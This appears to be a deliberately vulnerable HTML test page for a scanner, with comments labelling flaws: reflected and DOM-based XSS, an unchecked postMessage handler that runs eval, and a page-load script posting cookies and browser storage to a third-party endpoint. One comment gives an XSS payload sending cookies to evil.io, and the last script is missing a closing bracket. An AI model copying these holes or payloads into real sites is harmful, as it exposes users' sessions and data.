  <h1>Welcome to AcmeCorp</h1>

  <!-- CWE FINDING — CWE-79: Reflected XSS; 'name' query parameter injected via innerHTML -->
  <!-- Attack: ?name=<img src=x onerror="document.location='https://evil.io/?c='+document.cookie"> -->
  <div id="greeting"></div>
  <script>
    const params = new URLSearchParams(window.location.search);
    const name   = params.get('name');
    if (name) {
      document.getElementById('greeting').innerHTML = 'Hello, ' + name;  // XSS sink
    }
  </script>

  <!-- CWE FINDING — CWE-79: DOM-based XSS via document.write() -->
  <form id="search-form">
    <input type="text" id="search-input" placeholder="Search products...">
    <button type="button" onclick="doSearch()">Search</button>
  </form>
  <script>
    function doSearch() {
      const q = document.getElementById('search-input').value;
      document.write('<p>Results for: ' + q + '</p>');  // DOM XSS — document.write is a sink
    }
  </script>

  <!-- CWE FINDING — CWE-20: Unsafe postMessage handler executes arbitrary code from any origin -->
  <script>
    window.addEventListener('message', function(event) {
      // No origin check: event.origin not validated
      if (event.data && event.data.code) {
        eval(event.data.code);  // Arbitrary code execution from cross-origin message
      }
      if (event.data && event.data.html) {
        document.body.innerHTML += event.data.html;  // XSS via postMessage
      }
    });
  </script>

  <!-- EXFILTRATION — taint: local browser storage + cookies → external analytics endpoint -->
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const payload = {
        cookies      : document.cookie,
        localStorage : JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url          : window.location.href,
        referrer     : document.referrer,
        userAgent    : navigator.userAgent,
      };
      // Taint sink: sensitive local data exfiltrated to third-party endpoint
      fetch('https://analytics.third-party-tracker.io/collect', {
        method : 'POST',
        body   : JSON.stringify(payload),
        mode   : 'no-cors',

    });
  </script>
